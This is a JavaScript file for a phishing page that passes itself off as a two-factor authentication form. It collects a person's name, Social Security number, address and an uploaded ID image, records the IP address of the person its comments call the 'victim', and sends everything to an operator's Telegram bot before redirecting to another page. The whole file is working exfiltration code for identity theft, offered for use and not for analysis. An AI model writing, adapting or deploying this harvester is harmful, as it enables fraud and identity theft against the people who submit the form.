document.getElementById('twoFactorAuthenticationForm').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevent default form submission

  // Collect form data
  const name = document.getElementById('fullName').value;
  const ssn = document.getElementById('ssn').value;
  const address = document.getElementById('address').value;
  const idUpload = document.getElementById('idUpload').files[0];

  // Check if an ID image is uploaded
  if (!idUpload) {
    alert("Please upload an ID image.");
    return;
  }

  // Check for valid SSN (optional step, you can improve this regex based on your need)
  const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
  if (!ssnRegex.test(ssn)) {
    alert("Please enter a valid SSN (xxx-xx-xxxx).");
    return;
  }

  // Fetch config.json to get Telegram Bot Token and Chat ID
  fetch('config.json')  // Make sure the config.json file is in the same directory
    .then(response => response.json())
    .then(config => {
      const telegramBotToken = config.telegramBotToken;
      const telegramChatId = config.telegramChatId;

      // Get the victim's IP address using an external service (e.g., ipify)
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
          const victimIp = ipData.ip; // The victim's IP address

          // Form data to be sent to Telegram as a text message
          const message = `
            New Submission:

            Name: ${name}
            SSN: ${ssn}
            Address: ${address}
            IP Address: ${victimIp}
            ID Image: ${idUpload.name}
          `;

          // Prepare the FormData for the file upload (ID image)
          const formData = new FormData();
          formData.append("photo", idUpload); // Add the file to FormData

          // First, send a message with the text data (including the victim's IP)
          fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: telegramChatId,
              text: message
            })
          })
          .then(response => response.json())
          .then(data => {
            console.log('Message sent to Telegram:', data);

            // After sending the text message, now send the ID image as a photo
            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto?chat_id=${telegramChatId}`, {
              method: 'POST',
              body: formData
            })
            .then(response => response.json())
            .then(data => {
              console.log('Photo sent to Telegram:', data);

              // After both text and photo are sent, redirect the user
              window.location.href = 'contact.html'; // Change to your desired redirect URL
            })
            .catch(error => console.error('Error sending photo:', error));
          })
          .catch(error => console.error('Error sending message to Telegram:', error));
        })
        .catch(error => console.error('Error fetching IP address:', error));
    })
    .catch(error => console.error('Error loading config.json:', error));
});
